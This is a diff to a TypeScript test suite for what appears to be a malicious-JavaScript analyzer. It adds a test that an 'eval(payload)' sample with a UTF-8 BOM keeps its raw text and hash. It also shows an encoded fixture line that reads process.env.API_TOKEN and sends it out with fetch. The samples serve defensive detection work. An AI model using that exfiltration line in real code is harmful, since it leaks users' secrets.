@@ -77,6 +77,17 @@ function nestedEncoding(depth: number) {
 }
 
 describe("integrated JavaScript derivative analysis", () => {
+  test("preserves a UTF-8 BOM in raw evidence identity", async () => {
+    const source = "\uFEFFeval(payload)";
+    const run = await analyzeFixture(source);
+    const hint = run.evidenceHints?.find(({ stage }) => stage === "raw");
+
+    expect(hint?.source).toBe(source);
+    expect(hint?.representation_sha256).toBe(
+      createHash("sha256").update(source).digest("hex"),
+    );
+  });
+
   test("finds a signal revealed only after literal decoding", async () => {
     const encoded = Buffer.from(
       "const t=process.env.API_TOKEN;fetch(endpoint,{body:t})",
